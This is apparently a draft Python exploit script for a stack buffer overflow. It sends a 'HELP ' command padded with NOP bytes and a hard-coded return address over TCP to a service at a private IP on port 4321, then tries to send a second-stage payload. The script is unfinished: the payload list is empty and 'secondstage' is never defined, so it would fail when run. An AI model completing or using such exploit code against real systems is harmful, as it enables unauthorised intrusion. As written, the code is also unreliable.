
#!/usr/bin/env python3

from socket import socket, AF_INET, SOCK_STREAM, timeout, error
from struct import pack
from sys import exit
from time import sleep

# CONSTANTS
rhost = "192.168.29.201"
rport = 4321
target = (rhost, rport)
timeout_val = 10  # seconds

exploit = b"HELP "
exploit += b"\x90" * 7
exploit += b'\x5D\x38\x82\x7C'
payload = []
exploit += b"\x90" * (42 - len(payload))
#exploit += b"\xCC" * (2 - len(payload))


if __name__ == '__main__':
    print('[*] creating the socket')
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(timeout_val)
    print('[*] connecting to the target')
    s.connect(target)
    s.recv(1024)
    print('[*] sending exploit')
    s.send(exploit)
    print('[*] sending out payload value')

    sleep(10)
    s.send(secondstage)
    print('[*] cleaning up')
   # s.close()
